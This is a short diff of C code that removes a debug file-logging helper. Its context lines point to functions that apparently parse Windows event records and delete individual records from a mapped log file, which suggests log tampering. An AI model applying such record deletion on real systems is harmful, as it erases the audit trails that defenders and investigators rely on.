@@ -208,20 +208,6 @@ PVOID GetTemplateDefinition(PBYTE chunkPtr, PEVENT_RECORD recordPtr, PBYTE templ
 	return result;
 }
 
-int LogfileLong(char *buf)
-{
-	FILE* fp2;
-	int err = fopen_s(&fp2, "c:\\test\\log.txt", "ab+");
-	if (err != 0)
-	{
-		printf("[!]Createfile error!\n");
-		return 0;
-	}
-	fwrite(buf, 1118208, 1, fp2);
-	fclose(fp2);
-	return 1;
-}
-
 ULONG DeleteRecord(PVOID mapAddress, ULONG64 recordNumber)
 {
 	ULONG result = FAILURE;
